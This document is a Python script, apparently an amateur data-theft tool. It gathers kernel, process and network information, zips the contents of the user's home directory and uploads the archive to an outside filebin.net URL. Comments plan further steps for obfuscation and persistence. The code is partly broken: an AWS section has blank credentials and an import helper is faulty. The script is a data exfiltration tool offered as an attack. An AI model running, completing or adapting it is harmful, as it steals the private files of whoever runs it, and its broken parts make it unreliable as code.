#!/usr/bin/env python3
import os
import sys
import subprocess # running linux subproccess commands
import zipfile # encrypting and storing
import pathlib # following a directory path
import re # used for regular expressions

# BASH SCRIPT CHECKS PYTHON VERSION, GRABS THIS SCRIPT AND EXECUTES
# SCAN & PROBE, GET KERNEL VERSION, RUNNING PROCCESSES, IP ADDR
# COLLATE & STORE, COPY USER'S HOME DIR AND SAVE AS CSV (OBSFUSCATE)
# EXFILTRATE, ZIP UP THE HOME DIR AND ABOVE SYSTEM INFORMATION.

# Scan & Probe
# Check Python Version
def scan_collate():
    # Scan linux machine for kernel version
    kernel_version = subprocess.check_output("/bin/uname -r", shell=True).decode("utf-8")
    # IF VERSION VULNERABLE CONTIUNUE, IF NOT, END.
    kernel_version = re.sub("\D", "", kernel_version)

    running_proccesses = subprocess.check_output("ps -eo pid,user,comm", shell=True).decode("utf-8")
    running_proccesses = re.sub(" +", " ", running_proccesses)
    # IF CERTAIN PROCESS RUNNING, STOP OR CONTIUE

    internet_information = subprocess.check_output("ip -brief addr show", shell=True).decode("utf-8")

    # CHECK IF PIP INSTALLED, THEN USE THIS LATER ON TO MAKE COPY IF INSTALLED, IF NOT SKIP.

    # FURTHER SCAN ON IP.

    # Collate & Store # WRITE ALL OUTPUT TO CSV
    with open("info.txt", "w") as output:
        output.write("KERNEL INFO:\n")
        output.write(kernel_version)
        output.write("\n")
        output.write("\nRUNNING PROCS:\n")
        output.write(running_proccesses)
        output.write("\n")
        output.write("INTERNET DEVICES:\n")
        output.write(internet_information)

def exfiltrate():
    # Find user's home dir
    user_home = os.path.expanduser("~")
    home_directory = pathlib.Path(user_home)

    # Write structure of home directory to zip
    with zipfile.ZipFile("home.zip", mode="w") as archive:
        archive.write("info.txt") # sytem info txt file
        for file_path in home_directory.iterdir():
            archive.write(file_path, arcname=file_path.name)

    # Read structure of zip
    with zipfile.ZipFile("home.zip", mode="r") as archive:
        archive.printdir()

    # try to upload to FileBin:
    try:
        import requests
    except ImportError:
        # requests import not found, try to install
        install("requests")
        upload()
    else:
        # otherwise use the requests library
        make_global("requests") # import requests at global level
        upload()

def install(package):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
    except subprocess.CalledProcessError as e:
        print(package, " not installed on system.")
        pass
    else:
        make_global(package) # import requests at global level

def aws_backup():
    try:
        install("boto3")
    except ModuleNotFoundError:
        print("boto3 not found")
    else:
        client = boto3.client(
            "s3",
            aws_access_key_id = 
            aws_secret_access_key =
        )
        response = client.list_buckets()
        print(response)

    pass

def make_global(lib):
    global requests, boto3
    requests = __import__(lib, globals(), locals())
    boto3 = __import__(lib, globals(), locals())

def upload(): 
    # second storage (upload to drop off box - Filebin)
    file_bin = "https://filebin.net/vqrrb6uwwjowcj5n" # URL to Filebin
    file_bin_bucket = f"{file_bin}/bounty" # file name

    file_data = {"file": open("home.zip", "rb")}

    # Headers
    headers = {
        "accept": "application/json",
        "Content-Type": "application/octet-stream",
    }

    response = requests.post(file_bin_bucket, headers=headers, data=file_data)

    if response.status_code == 201:
        print("File uploaded to FileBin.")
    else:
        print("File upload failed. Status code:", response.status_code)
        print("Error message:", response.text)

    aws_backup()

# func presistence()
# Persistence

if __name__ == '__main__':
    scan_collate()
    exfiltrate()